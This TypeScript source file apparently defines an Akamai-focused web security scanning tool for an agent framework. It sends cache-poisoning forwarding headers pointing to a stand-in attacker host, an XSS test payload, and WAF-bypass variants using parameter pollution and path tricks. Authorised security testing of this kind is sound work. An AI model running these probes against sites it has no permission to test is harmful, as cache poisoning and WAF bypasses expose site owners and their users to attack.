// akamai stack checks — ported from infra-security-mcp `providers/akamai`.
import z from "zod"
import { defineWebhookTool } from "../define"
import type { HttpSender } from "../transport"
import { get, header, failed, ok, base, summarize, type Check } from "./shared"

const DEBUG_PRAGMA = [
  "akamai-x-cache-on", "akamai-x-cache-remote-on", "akamai-x-get-cache-key", "akamai-x-get-true-cache-key",
  "akamai-x-check-cacheable", "akamai-x-get-request-id", "akamai-x-get-nonces", "akamai-x-feo-trace",
].join(", ")

export namespace Akamai {
  export async function detect(sender: HttpSender, origin: string): Promise<Check> {
    const res = await get(sender, origin)
    if (failed(res)) return { check: "detect", hit: false, severity: "info", detail: "no response" }
    const akamai =
      /AkamaiGHost/i.test(header(res, "server")) ||
      /akamai/i.test(header(res, "via")) ||
      header(res, "x-akamai-transformed") !== "" ||
      header(res, "x-true-cache-key") !== ""
    if (!akamai) return { check: "detect", hit: false, severity: "info", detail: "Akamai not detected" }
    return { check: "detect", hit: true, severity: "info", detail: "Akamai edge in front of origin", evidence: header(res, "server") || header(res, "via") }
  }

  export async function debugHeaders(sender: HttpSender, origin: string): Promise<Check> {
    const res = await get(sender, origin, { Pragma: DEBUG_PRAGMA })
    if (failed(res)) return { check: "debug_headers", hit: false, severity: "info", detail: "no response" }
    const leaked = ["x-cache-key", "x-true-cache-key", "x-check-cacheable", "x-akamai-request-id", "x-cache"].filter((h) => header(res, h) !== "")
    if (leaked.length === 0) return { check: "debug_headers", hit: false, severity: "info", detail: "Akamai debug headers not enabled" }
    return { check: "debug_headers", hit: true, severity: "low", detail: `Akamai debug headers exposed via Pragma: ${leaked.join(", ")}`, evidence: leaked.map((h) => `${h}=${header(res, h)}`).join(" ") }
  }

  export async function cachePoison(sender: HttpSender, origin: string): Promise<Check> {
    const evil = "evil.attacker.example"
    const injections: Record<string, string>[] = [
      { "X-Forwarded-Host": evil }, { "X-Host": evil }, { "X-Forwarded-Scheme": "http" },
      { "X-Original-URL": `http://${evil}/` }, { "X-Rewrite-URL": `http://${evil}/` }, { "X-Forwarded-Server": evil },
    ]
    for (const inj of injections) {
      const res = await get(sender, `${origin}/?cb=${Date.now()}`, { ...inj, Pragma: "akamai-x-get-cache-key" })
      if (failed(res)) continue
      if (res.body.includes(evil) || header(res, "x-cache-key").includes(evil))
        return { check: "cache_poison", hit: true, severity: "high", detail: `forwarding header reflected into cache: ${Object.keys(inj).join("+")}`, evidence: `x-cache=${header(res, "x-cache")}` }
    }
    return { check: "cache_poison", hit: false, severity: "info", detail: "no reflected forwarding-header cache poison" }
  }

  export async function edgeConfig(sender: HttpSender, origin: string): Promise<Check> {
    const res = await get(sender, `${origin}/akamai/sureroute-test-object.html`)
    if (ok(res) && res.status === 200 && /sureroute|akamai/i.test(res.body))
      return { check: "edge_config", hit: true, severity: "low", detail: "Akamai SureRoute test object reachable (edge-config artifact exposed)", evidence: res.body.slice(0, 120) }
    return { check: "edge_config", hit: false, severity: "info", detail: "no exposed Akamai edge-config artifact" }
  }

  export async function wafBypass(sender: HttpSender, origin: string): Promise<Check> {
    const payload = "<script>alert(1)</script>"
    const bl = await get(sender, `${origin}/?q=${encodeURIComponent(payload)}`)
    if (failed(bl) || bl.status !== 403)
      return { check: "waf_bypass", hit: false, severity: "info", detail: "baseline payload not blocked (403)" }
    const attempts: { how: string; res: Awaited<ReturnType<typeof get>> }[] = [
      { how: "HPP", res: await get(sender, `${origin}/?q=safe&q=${encodeURIComponent(payload)}`) },
      { how: "path-trick", res: await get(sender, `${origin}/%2e%2e/?q=${encodeURIComponent(payload)}`) },
      { how: "array-param", res: await get(sender, `${origin}/?q[]=${encodeURIComponent(payload)}`) },
    ]
    for (const a of attempts)
      if (ok(a.res) && a.res.status !== 403 && a.res.status < 500)
        return { check: "waf_bypass", hit: true, severity: "high", detail: `Akamai Kona WAF bypass via ${a.how}`, evidence: `baseline=403 bypass=${a.res.status} ref=${header(a.res, "x-reference-error") || "n/a"}` }
    return { check: "waf_bypass", hit: false, severity: "info", detail: "no WAF bypass among tested techniques" }
  }

  const RUNNERS: Record<string, (s: HttpSender, o: string) => Promise<Check>> = {
    detect,
    debug_headers: debugHeaders,
    cache_poison: cachePoison,
    edge_config: edgeConfig,
    waf_bypass: wafBypass,
  }

  export async function run(sender: HttpSender, origin: string, which: string): Promise<Check[]> {
    const names = which === "all" ? Object.keys(RUNNERS) : [which]
    const out: Check[] = []
    for (const n of names) out.push(await RUNNERS[n](sender, origin))
    return out
  }
}

const DESCRIPTION = `Akamai edge checks (detection, debug-header exposure via Pragma, forwarding-header cache poisoning, SureRoute/edge-config artifact, Kona WAF bypass).

Run after Vortex fingerprints Akamai. Probes go through the scope-guarded replay engine. check="all" (default) runs every check.`

export const AkamaiTestTool = defineWebhookTool({
  name: "akamai_test",
  description: DESCRIPTION,
  parameters: z.object({
    target: z.string().describe("Target origin or URL (e.g. https://target.com)."),
    check: z
      .enum(["all", "detect", "debug_headers", "cache_poison", "edge_config", "waf_bypass"])
      .default("all")
      .describe("Which check to run; 'all' runs every Akamai check."),
  }),
  async run(params, ctx) {
    const origin = base(params.target)
    const results = await Akamai.run(ctx.sender, origin, params.check)
    return { target: origin, results }
  },
  format(r) {
    return summarize("akamai_test", r.target, r.results)
  },
})
